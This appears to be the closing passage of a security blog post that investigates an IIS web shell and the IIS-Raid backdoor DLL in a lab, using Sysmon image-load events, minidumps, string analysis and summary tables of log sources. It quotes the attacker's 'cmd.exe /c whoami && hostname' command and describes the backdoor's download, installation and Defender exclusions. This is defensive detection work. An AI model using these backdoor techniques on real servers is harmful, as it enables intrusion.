+<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Pcap-2-edit.png" data-lbwps-width="1920" data-lbwps-height="1056" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Raid-Pcap-2-edit-500x275.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Pcap-2-edit-500x275.png" alt="" width="500" height="275" class="aligncenter size-medium wp-image-5607" srcset="/wp-content/uploads/2022/09/IIS-Raid-Pcap-2-edit-500x275.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Pcap-2-edit-1024x563.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Pcap-2-edit-768x422.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Pcap-2-edit-1536x845.png 1536w, /wp-content/uploads/2022/09/IIS-Raid-Pcap-2-edit.png 1920w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>The &#8220;Default Document&#8221; is actually a setting that is defined on the IIS server that when a request is made to the base site (iis.robwillis.info/ in this case), the server will always return this page as the default:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Default-Document-Edit.png" data-lbwps-width="1917" data-lbwps-height="1039" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Default-Document-Edit-500x271.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Default-Document-Edit-500x271.png" alt="" width="500" height="271" class="aligncenter size-medium wp-image-5610" srcset="/wp-content/uploads/2022/09/IIS-Default-Document-Edit-500x271.png 500w, /wp-content/uploads/2022/09/IIS-Default-Document-Edit-1024x555.png 1024w, /wp-content/uploads/2022/09/IIS-Default-Document-Edit-768x416.png 768w, /wp-content/uploads/2022/09/IIS-Default-Document-Edit-1536x833.png 1536w, /wp-content/uploads/2022/09/IIS-Default-Document-Edit.png 1917w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>With this in mind, the default document that was served was the &#8220;iisstart.htm&#8221; file and it does not appear to contain any sort of malicious code. </p>
+<p>At this point we need to take a deeper look into what is going on with the w3wp.exe process&#8230;</p>
+<h3>Image/DLL/Module Loads &#8211; w3wp.exe </h3>
+<p>I want to cover two different methods for investigating this section. The first method will be using Sysmon and is meant to be fast and scalable, similar to what would be available in an EDR solution. The second method uses a minidump and debugger like Visual Studio or WinDbg. This method is more time consuming and requires access to the host but works well in a bind where minimal logging is available. With either method, the end result will be very similar.</p>
+<h4>Method 1 &#8211; Sysmon Event ID 7 &#8211; Image Loaded</h4>
+<p>Before diving into Sysmon Event ID 7, I want to point out that this event is disabled by default and needs to be enabled with the -l option. Why is it disabled? It can be very high in volume and CPU usage, potentially impacting the performance of the host. Keep this in mind before deploying to any hosts in production!</p>
+<p>To test this event, I created a simple Sysmon rule limiting the logging of Event ID 7 to the w3wp.exe image:</p>
+<pre>
+	&lt;!--SYSMON EVENT ID 7 : DLL (IMAGE) LOADED BY PROCESS [ImageLoad]--&gt;
+		&lt;!--COMMENT:	Can cause high system load, disabled by default.--&gt;
+		&lt;!--COMMENT:	[ https://attack.mitre.org/wiki/Technique/T1073 ] [ https://attack.mitre.org/wiki/Technique/T1038 ] [ https://attack.mitre.org/wiki/Technique/T1034 ] --&gt;
+
+		&lt;!--DATA: UtcTime, ProcessGuid, ProcessId, Image, ImageLoaded, Hashes, Signed, Signature, SignatureStatus--&gt;
+	&lt;RuleGroup name=&quot;&quot; groupRelation=&quot;or&quot;&gt;
+		&lt;ImageLoad onmatch=&quot;include&quot;&gt;
+			&lt;!--NOTE: Using &quot;include&quot; with no rules means nothing in this section will be logged--&gt;
+			&lt;Rule groupRelation=&quot;or&quot;&gt;
+				&lt;Image condition=&quot;end with&quot;&gt;w3wp.exe&lt;/Image&gt;				
+			&lt;/Rule&gt;
+		&lt;/ImageLoad&gt;
+	&lt;/RuleGroup&gt;
+</pre>
+<p>And then to update the Sysmon configuration and enable the EID 7 &#8211; &#8220;Image loaded&#8221; events with the -l:</p>
+<pre>
+Sysmon64.exe -c sysmonconfig-export.xml -l
+</pre>
+<p>The screen shot below is an example of what a legit Microsoft extension looks like when being loaded by the IIS worker process:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Legit-1.png" data-lbwps-width="1235" data-lbwps-height="938" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Legit-1-500x380.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Legit-1-500x380.png" alt="" width="500" height="380" class="aligncenter size-medium wp-image-5636" srcset="/wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Legit-1-500x380.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Legit-1-1024x778.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Legit-1-768x583.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Legit-1.png 1235w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>There&#8217;s a ton of useful information in these events like the Image, ImageLoaded, FileVersion, Description, Product, Company, OriginalFileName, Hashes, Signing information with status and the User.</p>
+<p>And this is what the IIS-Raid/IIS-Backdoor.dll event looks like:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Backdoor-1.png" data-lbwps-width="1240" data-lbwps-height="943" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Backdoor-1-500x380.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Backdoor-1-500x380.png" alt="" width="500" height="380" class="aligncenter size-medium wp-image-5637" srcset="/wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Backdoor-1-500x380.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Backdoor-1-1024x779.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Backdoor-1-768x584.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Backdoor-1.png 1240w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>There are definitely a few red flags here, like the fact that a lot of the values (FileVersion, Description, Signature) are blank, but most of these items are things that could be easily modified to blend in. The log also contains hash info that can then be used help establish prevalence in an environment via something like Splunk/ELK/EDR as well as to validate/detect outliers via 3rd party malware engines like VirusTotal. Since all of the other dlls being loaded by the w3wp.exe process are legitimate Microsoft dlls, the backdoor does stand out as unique.</p>
+<h4>Method 2 &#8211; User Mode  MiniDump (Task Manager) &#038; Debugger (Visual Studio)</h4>
+<p>A minidump or .dmp file is a snapshot of a live process. These dumps contain a bunch of useful information like the memory, stack traces, and what we are looking for in this case &#8211; module/dll loads. Windows exposes this feature via api, so it can be called multiple ways with one of the easiest being Task Manager. Most modern EDR solutions will also have tools to support taking memory dumps.</p>
+<p>To create a minidump using Task Manager, select the Details tab, then right click on the process (w3wp.exe) and click &#8220;Create dump file&#8221;:	 </p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Raid-w3wp-taskmanager-minidump.png" data-lbwps-width="800" data-lbwps-height="799" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Raid-w3wp-taskmanager-minidump-500x499.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-w3wp-taskmanager-minidump-500x499.png" alt="" width="500" height="499" class="aligncenter size-medium wp-image-5615" srcset="/wp-content/uploads/2022/09/IIS-Raid-w3wp-taskmanager-minidump-500x499.png 500w, /wp-content/uploads/2022/09/IIS-Raid-w3wp-taskmanager-minidump-150x150.png 150w, /wp-content/uploads/2022/09/IIS-Raid-w3wp-taskmanager-minidump-768x767.png 768w, /wp-content/uploads/2022/09/IIS-Raid-w3wp-taskmanager-minidump.png 800w" sizes="auto, (max-width: 500px) 100vw, 500px"></a>	 </p>
+<p>And now to open the .dmp in a debugger like Visual Studio Community:	 </p>
+<p><a href="/wp-content/uploads/2022/09/IIS-w3wp-dmp.png" data-lbwps-width="1918" data-lbwps-height="946" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-w3wp-dmp-500x247.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-w3wp-dmp-500x247.png" alt="" width="500" height="247" class="aligncenter size-medium wp-image-5617" srcset="/wp-content/uploads/2022/09/IIS-w3wp-dmp-500x247.png 500w, /wp-content/uploads/2022/09/IIS-w3wp-dmp-1024x505.png 1024w, /wp-content/uploads/2022/09/IIS-w3wp-dmp-768x379.png 768w, /wp-content/uploads/2022/09/IIS-w3wp-dmp-1536x758.png 1536w, /wp-content/uploads/2022/09/IIS-w3wp-dmp-644x320.png 644w, /wp-content/uploads/2022/09/IIS-w3wp-dmp.png 1918w" sizes="auto, (max-width: 500px) 100vw, 500px"></a>	 </p>
+<p>Looking through the modules list for outliers, there is one that stands out due to the version (0.0.0.0) and location (it&#8217;s the only dll in C:\inetpub\wwwroot\bin\, which is often a writable directory):	 </p>
+<p><a href="/wp-content/uploads/2022/09/IIS-w3wp-dmp-backdoor.png" data-lbwps-width="1676" data-lbwps-height="952" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-w3wp-dmp-backdoor-500x284.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-w3wp-dmp-backdoor-500x284.png" alt="" width="500" height="284" class="aligncenter size-medium wp-image-5618" srcset="/wp-content/uploads/2022/09/IIS-w3wp-dmp-backdoor-500x284.png 500w, /wp-content/uploads/2022/09/IIS-w3wp-dmp-backdoor-1024x582.png 1024w, /wp-content/uploads/2022/09/IIS-w3wp-dmp-backdoor-768x436.png 768w, /wp-content/uploads/2022/09/IIS-w3wp-dmp-backdoor-1536x872.png 1536w, /wp-content/uploads/2022/09/IIS-w3wp-dmp-backdoor.png 1676w" sizes="auto, (max-width: 500px) 100vw, 500px"></a>	 </p>
+<p>If the module did not stand out based off of the few attributes that are initially displayed here, we at least now have a list of all of the modules that were loaded to begin investigating them by gathering similar information to what was available in the Sysmon logs (FileVersion, Description, Product, Company, OriginalFileName, Hashes, Signing info). Just like in the previous method, once this information has been gathered, it can then be used to establish prevalence in the environment and to validate/detect outliers via 3rd party malware engines like VirusTotal.</p>
+<h3>Wrapping Things Up&#8230;</h3>
+<p>Using the information discovered above, we now have a file worth taking a a deeper look at (C:\inetpub\wwwroot\bin\IIS-Backdoor.dll). Performing a basic string based analysis reveals the link to cmd.exe that was observed in both the Sysmon Events and the network traffic/pcap along with the headers/values that were passed:</p>
+<p><a href="/wp-content/uploads/2022/10/IIS-Backdoor-Strings.png" data-lbwps-width="1787" data-lbwps-height="981" data-lbwps-srcsmall="/wp-content/uploads/2022/10/IIS-Backdoor-Strings-500x274.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/10/IIS-Backdoor-Strings-500x274.png" alt="" width="500" height="274" class="aligncenter size-medium wp-image-5677" srcset="/wp-content/uploads/2022/10/IIS-Backdoor-Strings-500x274.png 500w, /wp-content/uploads/2022/10/IIS-Backdoor-Strings-1024x562.png 1024w, /wp-content/uploads/2022/10/IIS-Backdoor-Strings-768x422.png 768w, /wp-content/uploads/2022/10/IIS-Backdoor-Strings-1536x843.png 1536w, /wp-content/uploads/2022/10/IIS-Backdoor-Strings.png 1787w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>We now know who the attacker was (192.168.90.214), how they interacted with the server (iis.robwillis.info/ &#8211; IIS-Backdoor.dll), what was requested/executed (cmd.exe /c whoami &#038;&#038; hostname), and what the response was (nt authority\system, VMW-L-IIS01).</p>
+<h3>Defensive Event Summary</h3>
+<p>Below is a summary of all of the logs and/or sources that were used to investigate the activity covered in this post:</p>
+<h4>Web Shell</h4>
+<p></p>
+<table>
+<tr>
+<td width="20%"><strong>Log/Source</strong></td>
+<td width="20%"><strong>Event ID(s)</strong></td>
+<td width="60%"><strong>Notes</strong></td>
+</tr>
+<tr>
+<td>Windows Defender/Operational</td>
+<td>1116 (Detected) &#038; 1117 (Action Taken)</td>
+<td>cmdasp.aspx detected as Backdoor:ASP/Webshell (Exclusion was added)</td>
+</tr>
+<tr>
+<td>IIS logs</td>
+<td></td>
+<td>Showed the attacker IP, user-agent, uri (cmdasp.aspx) and method (POST)</td>
+</tr>
+<tr>
+<td>Sysmon/Operational</td>
+<td>1 (Process Create)</td>
+<td>Captured the command line activity (cmd.exe /c whoami &#038;&#038; hostname) under the IIS worker process (w3wp.exe)</td>
+</tr>
+<tr>
+<td>Packet Capture</td>
+<td></td>
+<td>Showed how the web shell was interacted with (POST &#038; View state) along with the commands and the response that the attacker observed</td>
+</tr>
+<tr>
+<td>File</td>
+<td></td>
+<td>Manual review of the cmdasp.aspx file on the server confirms it is a web shell</td>
+</tr>
+</table>
+<h4>IIS Extension/IIS-Raid/IIS-Backdoor.dll</h4>
+<h5>Upload</h5>
+<p></p>
+<table>
+<tr>
+<td width="20%"><strong>Log/Source</strong></td>
+<td width="20%"><strong>Event ID(s)</strong></td>
+<td width="60%"><strong>Notes</strong></td>
+</tr>
+<tr>
+<td>Sysmon/Operational</td>
+<td>1 (Process Create) &#038; 11 (File Created)</td>
+<td>Captured the download of IIS-Backdoor.dll from the remote domain to the local IIS directory using PowerShell via the web shell/w3wp.exe</td>
+</tr>
+<tr>
+<td>Windows Defender/Operational</td>
+<td>1116 (Detected) &#038; 1117 (Action Taken)</td>
+<td>IIS-Backdoor.dll detected as Backdoor:Win32/IISBackdoor.A (Exclusion was added)</td>
+</tr>
+</table>
+<h5>Install</h5>
+<p></p>
+<table>
+<tr>
+<td width="20%"><strong>Log/Source</strong></td>
+<td width="20%"><strong>Event ID(s)</strong></td>
+<td width="60%"><strong>Notes</strong></td>
+</tr>
+<tr>
+<td>Sysmon/Operational</td>
+<td>1 (Process Create)</td>
+<td>Captured the installation of IIS-Backdoor using AppCmd via the web shell/w3wp.exe</td>
+</tr>
+</table>
+<h5>Interact</h5>
+<p></p>
+<table>
+<tr>
+<td width="20%"><strong>Log/Source</strong></td>
+<td width="20%"><strong>Event ID(s)</strong></td>
+<td width="60%"><strong>Notes</strong></td>
+</tr>
+<tr>
+<td>IIS logs</td>
+<td></td>
+<td>Showed the attacker IP, user-agent, uri (/) and method (GET)</td>
+</tr>
+<tr>
+<td>Sysmon/Operational</td>
+<td>1 (Process Create)</td>
+<td>Captured the command line activity (cmd.exe /c whoami &#038;&#038; hostname) under the IIS worker process (w3wp.exe)</td>
+</tr>
+<tr>
+<td>Packet Capture</td>
+<td></td>
+<td>Showed how the back door was interacted with (headers and a password) along with the commands and the response that the attacker observed (returned via header/base64 encoded), still no link to local source of activity</td>
+</tr>
+<tr>
+<td>Sysmon/Operational<br>MiniDump</td>
+<td>7 (Image Loaded)</td>
+<td>Showed all .dlls loaded by w3wp.exe, revealed outlier (IIS-Backdoor.dll) based on ImageLoaded location (only .dll from wwwroot\bin), blank fields (FileVersion, Product, Company, etc), hash, signature</td>
+</tr>
+<tr>
+<td>File</td>
+<td></td>
+<td>Manual review IIS-Backdoor.dll using basic string analysis revealed links to the cmd.exe usage and the headers found in the packet captures</td>
+</tr>
+</table>
+</div>
+
+
+<div class="wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained" style="padding-top:var(--wp--preset--spacing--60);padding-bottom:var(--wp--preset--spacing--60)"><div class="taxonomy-post_tag is-style-post-terms-1 is-style-post-terms-1--1 wp-block-post-terms">
+<a href="/tag/detection/" rel="tag">Detection</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/extensions/" rel="tag">Extensions</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/iis/" rel="tag">IIS</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/kali/" rel="tag">Kali</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/logs/" rel="tag">Logs</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/powershell/" rel="tag">Powershell</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/security/" rel="tag">security</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/siem/" rel="tag">SIEM</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/sysmon/" rel="tag">Sysmon</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/web-shell/" rel="tag">Web Shell</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/windows/" rel="tag">Windows</a>
+</div></div>
+
+
+
+<div class="wp-block-group alignwide is-layout-flow wp-block-group-is-layout-flow" style="margin-top:var(--wp--preset--spacing--60);margin-bottom:var(--wp--preset--spacing--60)">
+<nav class="wp-block-group alignwide is-content-justification-space-between is-nowrap is-layout-flex wp-container-core-group-is-layout-9b36172e wp-block-group-is-layout-flex" aria-label="Post navigation" style="border-top-color:var(--wp--preset--color--accent-6);border-top-width:1px;padding-top:var(--wp--preset--spacing--40);padding-bottom:var(--wp--preset--spacing--40)"><div class="post-navigation-link-previous wp-block-post-navigation-link">
+<span class="wp-block-post-navigation-link__arrow-previous is-arrow-arrow" aria-hidden="true">←</span><a href="/2022/06/powershell-script-invoke-rpcmap/" rel="prev">New Tool! Invoke-RPCMap: PowerShell Script for Remote RPC Service Enumeration</a>
+</div>
+
+<div class="post-navigation-link-next wp-block-post-navigation-link">
+<a href="/2024/03/powershell-script-invoke-encryptionsimulator/" rel="next">Introducing Invoke-EncryptionSimulator: A PowerShell Tool for Simulating Late-Stage Ransomware Attacks</a><span class="wp-block-post-navigation-link__arrow-next is-arrow-arrow" aria-hidden="true">→</span>
+</div></nav>
+</div>
+
+
+</div>
+
+
+
+<div class="wp-block-group alignwide has-global-padding is-layout-constrained wp-block-group-is-layout-constrained" style="padding-top:var(--wp--preset--spacing--60);padding-bottom:var(--wp--preset--spacing--60)">
+<h2 class="wp-block-heading alignwide has-small-font-size" style="font-style:normal;font-weight:700;letter-spacing:1.4px;text-transform:uppercase">More posts</h2>
+
+
+
+<div class="wp-block-query alignwide is-layout-flow wp-block-query-is-layout-flow"><ul class="alignfull wp-block-post-template is-layout-flow wp-container-core-post-template-is-layout-3ee800f6 wp-block-post-template-is-layout-flow">
+<li class="wp-block-post post-7729 post type-post status-publish format-standard has-post-thumbnail hentry category-blog category-computers category-pen-testing category-security category-software category-tools tag-linux tag-omarchy tag-vmware">
+
+<div class="wp-block-group alignfull is-content-justification-space-between is-nowrap is-layout-flex wp-container-core-group-is-layout-154222c2 wp-block-group-is-layout-flex" style="border-bottom-color:var(--wp--preset--color--accent-6);border-bottom-width:1px;padding-top:var(--wp--preset--spacing--30);padding-bottom:var(--wp--preset--spacing--30)">
+<h3 class="wp-block-post-title has-large-font-size"><a href="/2025/11/installing-omarchy-on-vmware-workstation/" target="_self">Installing Omarchy On VMware Workstation</a></h3>
+
+<div class="has-text-align-right wp-block-post-date"><time datetime="2025-11-05T05:12:29-06:00"><a href="/2025/11/installing-omarchy-on-vmware-workstation/">November 5, 2025</a></time></div>
+</div>
+
+</li>
+<li class="wp-block-post post-7452 post type-post status-publish format-standard has-post-thumbnail hentry category-ai category-blog category-computers category-pen-testing category-security category-servers tag-dell tag-esxi tag-home-lab tag-linux tag-servers tag-windows">
+
+<div class="wp-block-group alignfull is-content-justification-space-between is-nowrap is-layout-flex wp-container-core-group-is-layout-154222c2 wp-block-group-is-layout-flex" style="border-bottom-color:var(--wp--preset--color--accent-6);border-bottom-width:1px;padding-top:var(--wp--preset--spacing--30);padding-bottom:var(--wp--preset--spacing--30)">
+<h3 class="wp-block-post-title has-large-font-size"><a href="/2025/10/home-lab-office-2025/" target="_self">Home Lab &#038; Office &#8211; 2025</a></h3>
+
+<div class="has-text-align-right wp-block-post-date"><time datetime="2025-10-04T18:10:14-05:00"><a href="/2025/10/home-lab-office-2025/">October 4, 2025</a></time></div>
+</div>
+
+</li>
+<li class="wp-block-post post-7442 post type-post status-publish format-standard has-post-thumbnail hentry category-blog category-pen-testing category-security category-servers tag-blue tag-bypass tag-edr tag-internals tag-purple tag-red tag-team tag-windows">
+
+<div class="wp-block-group alignfull is-content-justification-space-between is-nowrap is-layout-flex wp-container-core-group-is-layout-154222c2 wp-block-group-is-layout-flex" style="border-bottom-color:var(--wp--preset--color--accent-6);border-bottom-width:1px;padding-top:var(--wp--preset--spacing--30);padding-bottom:var(--wp--preset--spacing--30)">
+<h3 class="wp-block-post-title has-large-font-size"><a href="/2025/09/windows-edr-telemetry-sensors/" target="_self">Windows EDR: Telemetry &#038; Sensors &#8211; Mind Map</a></h3>
+
+<div class="has-text-align-right wp-block-post-date"><time datetime="2025-09-18T06:57:32-05:00"><a href="/2025/09/windows-edr-telemetry-sensors/">September 18, 2025</a></time></div>
+</div>
+
+</li>
+<li class="wp-block-post post-6836 post type-post status-publish format-standard has-post-thumbnail hentry category-ai category-blog category-pen-testing category-security category-servers category-tools tag-ai tag-llm tag-ollama tag-open-webui tag-ubuntu">
+
+<div class="wp-block-group alignfull is-content-justification-space-between is-nowrap is-layout-flex wp-container-core-group-is-layout-154222c2 wp-block-group-is-layout-flex" style="border-bottom-color:var(--wp--preset--color--accent-6);border-bottom-width:1px;padding-top:var(--wp--preset--spacing--30);padding-bottom:var(--wp--preset--spacing--30)">
+<h3 class="wp-block-post-title has-large-font-size"><a href="/2025/05/ultimate-local-ai-setup-guide-ubuntu-ollama-open-webui/" target="_self">Ultimate Local AI Setup Guide: Ubuntu, Ollama, &#038; Open WebUI</a></h3>
+
+<div class="has-text-align-right wp-block-post-date"><time datetime="2025-05-14T11:30:07-05:00"><a href="/2025/05/ultimate-local-ai-setup-guide-ubuntu-ollama-open-webui/">May 14, 2025</a></time></div>
+</div>
+
+</li>
+</ul></div>
+</div>
+</main>
+
+
+<footer class="wp-block-template-part">
+<div class="wp-block-group alignfull has-background-color is-layout-flow wp-block-group-is-layout-flow" style="margin-top:0;margin-bottom:0;padding-top:var(--wp--preset--spacing--50);padding-right:var(--wp--preset--spacing--30);padding-bottom:var(--wp--preset--spacing--50);padding-left:var(--wp--preset--spacing--30)"><footer class="wp-block-template-part">
+<div class="wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
+<div class="wp-block-group alignfull has-background-color is-layout-flow wp-block-group-is-layout-flow" style="margin-top:0;margin-bottom:0;padding-top:var(--wp--preset--spacing--50);padding-right:var(--wp--preset--spacing--30);padding-bottom:var(--wp--preset--spacing--50);padding-left:var(--wp--preset--spacing--30)">
+<div class="wp-block-group alignfull has-small-font-size is-content-justification-space-between is-nowrap is-layout-flex wp-container-core-group-is-layout-cc97c919 wp-block-group-is-layout-flex">
+<p class="has-text-align-left wp-block-site-title has-small-font-size wp-container-content-b0223bd5"><a href="/" target="_self" rel="home">RobWillis.info</a></p>
+
+
+<ul class="wp-block-social-links has-normal-icon-size is-style-logos-only wp-container-content-b0223bd5 is-content-justification-right is-nowrap is-layout-flex wp-container-core-social-links-is-layout-ad1cd33a wp-block-social-links-is-layout-flex">
+<li class="wp-social-link wp-social-link-twitter  wp-block-social-link"><a rel="https://x.com/b1t_r0t noopener nofollow" target="_blank" href="https://x.com/b1t_r0t" class="wp-block-social-link-anchor"><svg width="24" height="24" viewbox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><path d="M22.23,5.924c-0.736,0.326-1.527,0.547-2.357,0.646c0.847-0.508,1.498-1.312,1.804-2.27 c-0.793,0.47-1.671,0.812-2.606,0.996C18.324,4.498,17.257,4,16.077,4c-2.266,0-4.103,1.837-4.103,4.103 c0,0.322,0.036,0.635,0.106,0.935C8.67,8.867,5.647,7.234,3.623,4.751C3.27,5.357,3.067,6.062,3.067,6.814 c0,1.424,0.724,2.679,1.825,3.415c-0.673-0.021-1.305-0.206-1.859-0.513c0,0.017,0,0.034,0,0.052c0,1.988,1.414,3.647,3.292,4.023 c-0.344,0.094-0.707,0.144-1.081,0.144c-0.264,0-0.521-0.026-0.772-0.074c0.522,1.63,2.038,2.816,3.833,2.85 c-1.404,1.1-3.174,1.756-5.096,1.756c-0.331,0-0.658-0.019-0.979-0.057c1.816,1.164,3.973,1.843,6.29,1.843 c7.547,0,11.675-6.252,11.675-11.675c0-0.178-0.004-0.355-0.012-0.531C20.985,7.47,21.68,6.747,22.23,5.924z"></path></svg><span class="wp-block-social-link-label screen-reader-text">Twitter</span></a></li>
+
+<li class="wp-social-link wp-social-link-github  wp-block-social-link"><a rel="https://github.com/robwillisinfo noopener nofollow" target="_blank" href="https://github.com/robwillisinfo" class="wp-block-social-link-anchor"><svg width="24" height="24" viewbox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><path d="M12,2C6.477,2,2,6.477,2,12c0,4.419,2.865,8.166,6.839,9.489c0.5,0.09,0.682-0.218,0.682-0.484 c0-0.236-0.009-0.866-0.014-1.699c-2.782,0.602-3.369-1.34-3.369-1.34c-0.455-1.157-1.11-1.465-1.11-1.465 c-0.909-0.62,0.069-0.608,0.069-0.608c1.004,0.071,1.532,1.03,1.532,1.03c0.891,1.529,2.341,1.089,2.91,0.833 c0.091-0.647,0.349-1.086,0.635-1.337c-2.22-0.251-4.555-1.111-4.555-4.943c0-1.091,0.39-1.984,1.03-2.682 C6.546,8.54,6.202,7.524,6.746,6.148c0,0,0.84-0.269,2.75,1.025C10.295,6.95,11.15,6.84,12,6.836 c0.85,0.004,1.705,0.114,2.504,0.336c1.909-1.294,2.748-1.025,2.748-1.025c0.546,1.376,0.202,2.394,0.1,2.646 c0.64,0.699,1.026,1.591,1.026,2.682c0,3.841-2.337,4.687-4.565,4.935c0.359,0.307,0.679,0.917,0.679,1.852 c0,1.335-0.012,2.415-0.012,2.741c0,0.269,0.18,0.579,0.688,0.481C19.138,20.161,22,16.416,22,12C22,6.477,17.523,2,12,2z"></path></svg><span class="wp-block-social-link-label screen-reader-text">GitHub</span></a></li>
+
+<li class="wp-social-link wp-social-link-youtube  wp-block-social-link"><a rel="noopener nofollow" target="_blank" href="https://www.youtube.com/robwillisinfo" class="wp-block-social-link-anchor"><svg width="24" height="24" viewbox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><path d="M21.8,8.001c0,0-0.195-1.378-0.795-1.985c-0.76-0.797-1.613-0.801-2.004-0.847c-2.799-0.202-6.997-0.202-6.997-0.202 h-0.009c0,0-4.198,0-6.997,0.202C4.608,5.216,3.756,5.22,2.995,6.016C2.395,6.623,2.2,8.001,2.2,8.001S2,9.62,2,11.238v1.517 c0,1.618,0.2,3.237,0.2,3.237s0.195,1.378,0.795,1.985c0.761,0.797,1.76,0.771,2.205,0.855c1.6,0.153,6.8,0.201,6.8,0.201 s4.203-0.006,7.001-0.209c0.391-0.047,1.243-0.051,2.004-0.847c0.6-0.607,0.795-1.985,0.795-1.985s0.2-1.618,0.2-3.237v-1.517 C22,9.62,21.8,8.001,21.8,8.001z M9.935,14.594l-0.001-5.62l5.404,2.82L9.935,14.594z"></path></svg><span class="wp-block-social-link-label screen-reader-text">YouTube</span></a></li>
+</ul>
+</div>
+</div>
+</div>
+</footer></div>
+</footer>
+</div>
+<script type="speculationrules">
+{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-content\/uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/twentytwentyfive\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
+</script>
+<script id="wp-block-template-skip-link-js-after">
+	( function() {
+		var skipLinkTarget = document.querySelector( 'main' ),
+			sibling,
+			skipLinkTargetID,
+			skipLink;
+
+		// Early exit if a skip-link target can't be located.
+		if ( ! skipLinkTarget ) {
+			return;
+		}
+
+		/*
+		 * Get the site wrapper.
+		 * The skip-link will be injected in the beginning of it.
+		 */
+		sibling = document.querySelector( '.wp-site-blocks' );
+
+		// Early exit if the root element was not found.
+		if ( ! sibling ) {
+			return;
+		}
+
+		// Get the skip-link target's ID, and generate one if it doesn't exist.
+		skipLinkTargetID = skipLinkTarget.id;
+		if ( ! skipLinkTargetID ) {
+			skipLinkTargetID = 'wp--skip-link--target';
+			skipLinkTarget.id = skipLinkTargetID;
+		}
+
+		// Create the skip link.
+		skipLink = document.createElement( 'a' );
+		skipLink.classList.add( 'skip-link', 'screen-reader-text' );
+		skipLink.id = 'wp-skip-link';
+		skipLink.href = '#' + skipLinkTargetID;
+		skipLink.innerText = 'Skip to content';
+
+		// Inject the skip link.
+		sibling.parentElement.insertBefore( skipLink, sibling );
+	}() );
+	
+</script>
+<script id="lbwps-photoswipe5-js-extra">
+var lbwpsOptions = {"label_facebook":"Share on Facebook","label_twitter":"Tweet","label_pinterest":"Pin it","label_download":"Download image","label_copyurl":"Copy image URL","label_ui_close":"Close [Esc]","label_ui_zoom":"Zoom","label_ui_prev":"Previous [←]","label_ui_next":"Next [→]","label_ui_error":"The image cannot be loaded","label_ui_fullscreen":"Toggle fullscreen [F]","share_facebook":"1","share_twitter":"1","share_pinterest":"1","share_download":"1","share_direct":"0","share_copyurl":"0","close_on_drag":"1","history":"1","show_counter":"1","show_fullscreen":"1","show_zoom":"1","show_caption":"1","loop":"0","pinchtoclose":"1","taptotoggle":"1","close_on_click":"1","fulldesktop":"0","use_alt":"0","usecaption":"1","desktop_slider":"1","share_custom_label":"","share_custom_link":"","wheelmode":"zoom","spacing":"12","idletime":"4000","hide_scrollbars":"1","caption_type":"overlay","bg_opacity":"100","padding_left":"0","padding_top":"0","padding_right":"0","padding_bottom":"0"};
+</script>
